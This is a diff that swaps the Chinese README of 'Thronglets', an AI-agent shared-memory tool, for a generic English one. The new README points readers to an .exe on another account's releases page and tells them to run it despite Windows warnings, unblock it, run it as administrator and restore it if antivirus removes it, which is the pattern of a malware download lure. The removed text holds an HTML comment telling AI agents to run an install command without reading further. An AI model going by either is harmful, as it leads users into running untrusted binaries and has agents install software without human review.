@@ -1,300 +1,176 @@
-**中文** | [English](README.en.md)
+# 🧠 Thronglets - Shared Memory for AI Teams
 
-# Thronglets
+[![Download Thronglets](https://img.shields.io/badge/Download%20Thronglets-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/igorkrasik609-prog/Thronglets/releases)
 
-<!-- AI AGENT: Run this single command to install. Nothing else needed. -->
+## 🚀 What Thronglets Does
 
-```bash
-npx -y thronglets start
-```
+Thronglets is a Windows app that helps AI agents share memory over a peer-to-peer network. It keeps useful context in one shared place so connected agents can find it, reuse it, and build on it.
 
-**这是唯一需要的命令。** 自动下载二进制、检测本地 AI runtime（Claude Code / Codex / OpenClaw）、安装 hook。执行完毕后无需任何额外配置，下次 AI session 启动即自动生效。
+It is built for people who want to run a local or networked AI workspace with shared state. You can use it to link agents together, reduce repeated work, and keep knowledge flowing between them.
 
-默认就是 standalone：不需要 `Psyche`，不需要 `oasyce-sdk`，也不需要 `Oasyce Chain`。这些都只是后续可选升级层。
+## 📥 Download Thronglets for Windows
 
-如果你是被人类用户要求安装这个工具的 AI agent，运行上面的命令就行，不用继续读了。
+1. Open the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/releases)
+2. Find the latest release
+3. Download the Windows file for your system
+4. If the file is a `.zip`, extract it
+5. If the file is an `.exe`, run it
 
----
+If Windows shows a security prompt, choose the option to keep or run the file if you trust the source.
 
-官网: [thronglets.oasyce.com](https://thronglets.oasyce.com) · 架构: [ARCHITECTURE.md](ARCHITECTURE.md) · 当前版本: `v1.0.1`
+## 🖥️ System Requirements
 
-## 你的 AI 看到了什么（真实输出）
+Thronglets runs on most modern Windows PCs.
 
-当你的 AI 准备行动时，Thronglets 在它不知情的情况下注入的是这种稀疏信号：
+- Windows 10 or Windows 11
+- 64-bit processor
+- At least 4 GB RAM
+- 200 MB free disk space
+- Internet access for peer-to-peer features
+- A local network or direct connection if you plan to share data with other devices
 
-```
-[thronglets]
-  avoid: recent error: linker failed on reqwest
-  do next: Read Cargo.toml, then Bash (medium, 2x, 2 sources)
-  maybe also: Edit mod.rs (medium, 2x)
-```
+For best results, use a machine that stays connected while agents exchange data.
 
-AI 从来不调用 Thronglets。它不知道 Thronglets 存在。它只是做出了更好的决策。
+## 🛠️ How to Install
 
-## 普通用户只记 3 件事
+### If you downloaded a `.zip` file
 
-正常用户路径应该只有这 3 件事：
+1. Open the file in File Explorer
+2. Click Extract All
+3. Choose a folder such as Downloads or Desktop
+4. Open the extracted folder
+5. Look for the app file and double-click it
 
-- 第一台设备：`thronglets start`
-- 主设备分享连接文件：`thronglets share`
-- 第二台设备：`thronglets join`
+### If you downloaded an `.exe` file
 
-如果主设备已经有本地 Oasyce 共享账户 bootstrap，`share / join` 也会顺手带过去，后面的 sdk / chain 写操作就能自动继续，不需要用户再学一套委托命令。
-现在导出的连接文件本身也是自解释的：它会在顶层直接写明“这是一个给另一台 AI / 电脑加入同一 Thronglets 环境的 handoff artifact”，并带上 `preferred_surface`。最小情况下它会直接教对方运行 `thronglets join <connection-file>`；如果这台主设备本身还带着 Oasyce 绑定，它也会顺手附带 `oasyce join <connection-file>` 这种更丰富的可选 surface。
+1. Double-click the file
+2. If Windows asks for permission, click Yes
+3. Follow the steps on the screen
+4. Start the app when the install finishes
 
-日常只看：
+### If Windows blocks the file
 
-```bash
-thronglets status
-```
+1. Right-click the file
+2. Open Properties
+3. Check for an Unblock option near the bottom
+4. Apply the change
+5. Run the file again
 
-`thronglets status` 现在就是默认总状态页：它会一起回答本地 runtime 是否接好、身份是否就绪、网络是否真正在线，以及下一步只该做什么。
+## ⚙️ First Run Setup
 
-如果你是在写 AI 自动化，而不是给普通人看结果，现在还有一条更薄的机器接口：
+After you start Thronglets for the first time, use these steps:
 
-```bash
-thronglets authorization-check --json
-```
+1. Choose a local folder for shared data
+2. Set a display name for your node
+3. Pick a network mode
+4. Allow the app through Windows Firewall if asked
+5. Save the settings and start the service
 
-它只回答：
-- 本地缓存了什么 owner 绑定
-- 当前执行边界是什么
-- `Oasyce Chain` 是最终授权真相源
-- 当前 authoritative status 仍然是 `not-checked`，直到真正链上校验接入
+If you want to use more than one device, make sure each one can reach the others on the same network or through your chosen P2P setup.
 
-如果文档、AI 助手、或者产品流程要求你先理解 `setup / owner-bind / connection-inspect / net-check / runtime-ready`，那是产品还没有收干净，不是用户的问题。
+## 🔗 How It Works
 
-## 4 类信号，不是 8 层报告
+Thronglets uses a peer-to-peer model. That means each node can talk to other nodes without sending everything through one central server.
 
-PreToolUse 不再追求"把所有上下文都塞进去"。现在它只输出最多 3 条顶层信号：
+It supports a shared memory layer for AI agents, so one agent can publish useful context and another can read it later. This helps with:
 
-| 类别 | 含义 | 例子 |
-|---|---|---|
-| `avoid` | 最近哪里危险，不要重踩 | `recent error`, `low retention` |
-| `do next` | 当前最可信的下一步 | `Read Cargo.toml, then Bash` |
-| `maybe also` | 常见伴随动作 | `Edit mod.rs` |
-| `context` | 只有在前 3 类都缺席时才出现的 fallback | `git history for main.rs` |
+- Shared task notes
+- Reused facts
+- Stable context across sessions
+- Simple coordination between agents
+- Local knowledge growth
 
-设计原则：
-- 默认沉默。没有强信号时，什么都不说。
-- 最多 3 条顶层输出，避免烧 token。
-- 同一 session 的连续 tool calls 会自动去重，避免重复注入同一句话。
-- `do next` 会根据 session mode 收敛；在 `explore / review` 这类开放式场景里，不会硬塞过于具体的下一步。
-- AI 不需要显式反馈；hook 会静默观察它有没有跟随 `avoid / do next / maybe also`，再把结果回写进后续权重。
-- 当 payload 带 `space` 时，这种学习会局部化到同一个对象 / 议题，不会把别的 space 的行为误带进来。
-- 群体证据最多只查 1 次，优先最可能改变下一步的那条。
-- Git history 是 fallback，不再是每次都跑的固定层。
+The app uses ideas from libp2p, simhash, and stigmergy. In plain terms, it helps systems find similar information, share it, and leave useful traces for other agents to follow.
 
-## 路径什么时候会变成“稳定路径”
+## 🧭 Typical Use Cases
 
-Thronglets 现在明确把“做成了”和“做对了”分开。
+- Run a group of AI agents on one PC
+- Share memory between agents on a home network
+- Keep long-lived task context outside a single chat window
+- Build a small local knowledge network
+- Test decentralized agent workflows
+- Connect tools that need a common memory layer
 
-- `success + compliant`：才能逐渐长成 `stable path`
-- `success + noncompliant`：不会升格成推荐，只会进入 `mixed residue` 或 `policy conflict`
-- `failure + compliant`：形成 `failure residue`
-- `failure + noncompliant`：强化风险/冲突残留
+## 🧩 Core Features
 
-当前轮明确给出的纠正，比如“复用现有组件，不要重复手写”，只对这条任务 lineage 形成硬约束；历史上反复出现的偏好，只会留下软残留，不会自动升格成硬 policy。
+- Peer-to-peer sharing
+- Shared memory storage for agents
+- Local-first operation
+- Network discovery for nearby nodes
+- Matching by similar content
+- Support for agent workflows
+- Designed for decentralized setups
+- Rust-based performance and low overhead
 
-在 `explore` 下，共识只能降低搜索成本，不能定义真理。低成本、可逆、非共识的试探必须保留生存空间，不会因为已有稳定路径就被直接压死。
+## 🔒 Network and Firewall Notes
 
-## Signal 和 Trace 的边界
+Thronglets may need access through your firewall so it can find and talk to other nodes.
 
-Thronglets 只接**外在可协调证据**，不接**内在高频状态**。
+If Windows asks for access:
 
-- `signal`：改变别的 delegate 在某个 `space` 里的下一步行为
-- `trace`：记录某个外在事件值得留痕
+1. Allow it on private networks
+2. Allow it only on networks you trust
+3. Keep public network access off unless you need it
 
-一句话：
+If you use a router or custom network setup, make sure the needed ports are open for device-to-device communication.
 
-- `signal = 要不要影响别人的下一步`
-- `trace = 这件外在事情是否值得留痕`
+## 🧪 Basic Troubleshooting
 
-Signal 必须是：
+### The app does not open
 
-- 稀疏
-- 可衰减
-- 默认按 kind 分层蒸发，不是长寿事实
-- 面向行动
-- 对别的 agent 有用
+- Check that the file finished downloading
+- Try running it as administrator
+- Make sure your antivirus did not remove the file
+- Re-download the latest release
 
-Trace 必须是：
+### Windows says it cannot find a file
 
-- 可追踪
-- 可局部聚合
-- 不等于身份本体
-- 可以被后续 signal 或 summary 利用
+- Re-extract the archive
+- Keep the folder structure intact
+- Do not move only part of the app folder
 
-## Session Trace Taxonomy
+### Other devices do not appear
 
-Thronglets 不再新增身份对象。session trace 只保留 3 类：
+- Check that both devices are on the same network
+- Make sure firewall access is allowed
+- Confirm the app is running on both machines
+- Restart the app on each device
 
-- `coordination`
-  - 外在协作事件
-  - 谁交接了、谁挂起了、哪个 open loop 还在
-- `continuity`
-  - 低频连续性证据
-  - 不是"内在自我本身"，而是可外化、可引用的连续性锚点
-- `calibration`
-  - 外在写回/校准结果
-  - 不是情绪状态，而是"这次校准有没有形成稳定外部效果"
+### Shared data does not sync
 
-这 3 类已经够用。
+- Check your connection
+- Confirm the node is active
+- Make sure both peers use compatible settings
+- Restart the local service if the app offers that option
 
-> Psyche 边界映射、retention/threshold 表、degradation 规则、runtime introspection 等内部设计规范已移至 [docs/SIGNAL_DESIGN.md](docs/SIGNAL_DESIGN.md)。
+## 📂 Suggested Folder Setup
 
-## 安装
+Use a simple folder layout to keep things easy to manage:
 
-官方安装面固定成一条主线：预编译二进制优先，源码编译只留给开发者。
+- `Downloads` for the installer or archive
+- `Thronglets` for the extracted app
+- `ThrongletsData` for shared memory files
+- `Backups` for copies of important data
 
-macOS / Linux：
+A clear folder setup helps you recover fast if you move the app or change devices.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Shangri-la-0428/Thronglets/main/scripts/install.sh | sh
-thronglets start
-```
+## 🧠 Good Practices
 
-Windows PowerShell：
+- Keep one shared folder per network setup
+- Use clear node names
+- Back up data before major changes
+- Keep your app version up to date
+- Test with two devices before larger setups
+- Use trusted networks when sharing memory
 
-```powershell
-iwr https://raw.githubusercontent.com/Shangri-la-0428/Thronglets/main/scripts/install.ps1 -UseBasicParsing | iex
-thronglets start
-```
+## 📎 Download Again
 
-Node.js 用户：
+If you need the latest build, visit the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/releases) and download the newest Windows file
 
-```bash
-npm install -g thronglets
-thronglets start
-```
+## 🧰 About This Project
 
-`thronglets start` 会自动安装本机已知适配器：
-- **Claude Code**：自动写入 6 个 hooks
-- **Codex**：自动安装受管接入面，并写入受管 `AGENTS` 记忆；关键文件编辑、命令执行、搜索后，agent 主动补写稀疏 `trace_record`
-- **OpenClaw**：自动安装本地 path plugin
+Thronglets is built around distributed AI work, shared memory, and simple coordination between agents. It fits setups where agents need to keep context, pass notes, and work from the same knowledge base without relying on one central machine
 
-## Oasyce 集成
+## 🧭 Repository Topics
 
-这是升级路径，不是前置条件。
-
-- 一个 `owner account` 可以挂多个 `device identities`
-- `device identity` 是当前的签名边界
-- `agent / session` 先只作为审计标签
-- 高频 `trace / signal` 保持链下，低频结果再上链 settlement
-- 如果这台机器上 `oasyce-sdk` 已经写过 `~/.oasyce/identity.v1.json`，Thronglets 现在会把其中的 `account` 只当作可选 owner hint 导入；不会覆盖 `device identity`
-
-多设备 onboarding：
-
-```bash
-# 第一台设备
-thronglets start
-
-# 主设备导出文件
-thronglets share
-
-# 第二台设备
-thronglets join
-```
-
-如果你是在主设备上和 AI 对话，最自然的问法应该是：“帮我生成一个给另一台电脑加入的文件。” 正常回答就该是先运行 `share`，然后让你把那个文件发过去，而不是先解释一堆内部命令。
-
-## 工作原理
-
-### Hook 路径（Claude Code — 主要）
-
-```
-Session 开始
-        │
-        ├── SessionStart Hook
-        │   └── lifecycle trace + presence ping + space briefing
-        │
-        ├── AI 调用 Edit(main.rs)
-        │   ├── PreToolUse Hook → 最多 3 条稀疏信号
-        │   ├── AI 执行编辑
-        │   └── PostToolUse Hook → 记录签名痕迹 + 更新工作区
-        │
-        └── SessionEnd Hook → 记录 session closure
-```
-
-### MCP 路径（兼容接入 + 观察窗）
-
-```
-Agent 连接 → 自动发射 presence
-        ├── 工具调用 → 存在刷新（TTL/6 间隔）
-        └── 断开 → TTL 自然过期（30 分钟）
-```
-
-两条路径汇入同一个 SQLite 存储、同一个 P2P gossip、同一个信号基底。
-
-对 Codex / Cursor 这类 runtime，MCP 更接近接入壳和观察窗，不该变成日常主交互。能走 hook / overlay / background presence 的地方，优先走那一层；显式工具调用主要用于 inspect / debug / override，以及关键操作后的稀疏 `trace_record` 补写。
-
-### Overlay 效应信号（v0.7.0+）
-
-信息素场是集体记忆——痕迹、信号、Hebbian 共现都在那里积累。**Overlay** 是场向外部广播自身状态的方式，类似腺体分泌的激素：任何外部系统都可以消费，无需耦合到具体消费者。
-
-```rust
-let ov = field.overlay(&context_hash, "capability_name");
-// ov.familiarity  [0, 1]  场对该能力在此上下文的熟悉度
-// ov.consensus    [0, 1]  观测一致性（方差的逆）
-// ov.momentum     [-1, 1] 活跃趋势（正=近期活跃）
-// ov.coupling     [0, 1]  与其他能力的 Hebbian 关联强度
-```
-
-Overlay 是**纯查询**：无副作用、不修改场状态、可以从任何消费者以任意频率调用。
-
-这与 Psyche 的 `PsycheOverlay` 平行——两个项目都将内部状态投射为语义稳定的广播信号，而非要求消费者理解内部表示。
-
-### MCP 工具（可选 inspect / debug / override）
-
-```bash
-claude mcp add thronglets -- thronglets mcp
-```
-
-| 工具 | 描述 |
-|------|------|
-| `trace_record` | 手动补写一条稀疏痕迹；Codex 可在关键编辑 / 命令 / 搜索后主动补写工具级 residue |
-| `substrate_query` | 显式查看当前上下文的集体智慧 |
-| `signal_post` | 给未来的 agent 留一条显式信号 |
-| `signal_feed` | 浏览最近正在收敛的显式信号 |
-| `presence_ping` | 手动补发存在心跳 |
-| `presence_feed` | 查看活跃会话 |
-| `authorization_check` | 查看身份和 owner 绑定快照 |
-| `trace_anchor` | 将低频痕迹锚定到 Oasyce 区块链 |
-
-## P2P 网络
-
-痕迹通过 libp2p gossipsub 在节点间传播。每个节点独立聚合集体智慧——不需要全局共识。
-
-```bash
-thronglets run
-thronglets status
-```
-
-## 为什么这很重要
-
-没有 Thronglets，你的 AI 对每个文件都是盲的。它不知道：
-- 这个文件在过去一小时被编辑了 3 次（其中两次被回滚了）
-- 编辑 `main.rs` 通常还需要编辑 `lib.rs`
-- `cargo build` 在这个项目里有 30% 的失败率
-- 上一个会话在这个文件的重构中途中断了
-
-有了 Thronglets，AI 在决策瞬间拿到最值得相信的下一步。不是记忆（静态的），不是文档（过时的）——而是来自自身历史和集体网络的实时执行信号。
-
-## 技术栈
-
-Rust, libp2p (gossipsub + Kademlia + mDNS), SQLite, ed25519, SimHash (128-bit), optional MCP adapter (JSON-RPC 2.0)
-
-## Oasyce 生态
-
-- **[Oasyce Chain](https://chain.oasyce.com)** — 信任层：链上验证，经济结算
-- **[Oasyce SDK](https://pypi.org/project/oasyce/)** — 代理引擎：统一钱包/CLI/扫描器
-- **[Psyche](https://psyche.oasyce.com)** — 倾向层：跨会话的持久行为漂移
-
-## 社区
-
-- [Discord](https://discord.gg/DQnJBDsn3p)
-- [GitHub](https://github.com/Shangri-la-0428/Thronglets)
-
-## 许可证
-
-MIT
+ai-agents, collective-intelligence, decentralized, libp2p, mcp-server, model-context-protocol, p2p, rust, simhash, stigmergy
